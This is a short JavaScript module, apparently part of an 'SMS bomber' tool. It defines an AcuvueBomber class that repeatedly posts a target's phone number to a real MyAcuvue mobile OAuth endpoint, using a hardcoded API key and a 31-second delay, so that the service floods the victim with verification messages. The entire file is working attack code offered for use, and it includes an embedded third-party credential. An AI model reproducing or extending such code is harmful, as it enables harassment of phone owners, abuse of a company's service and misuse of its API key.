const Bomber = require("../bomber");
const requestTypes = require("../../data-structures/requestTypes");

class AcuvueBomber extends Bomber {
    constructor(phone){
        super(phone);
        this.data = {
            phoneNumber: this.phone
        };
    }
    headers = {
        "x-api-key": "XoA3wMy3d8LNGDToaWz1yQdjRiKcjLWu"
    }
    requestType = requestTypes.post;
    static country = "RU";
    siteName = "acuvue";
    delay = 31000;
    url = 'https://jnj-prod.apigee.net/myacuvue/oauth/mobile';  
}
module.exports =  AcuvueBomber;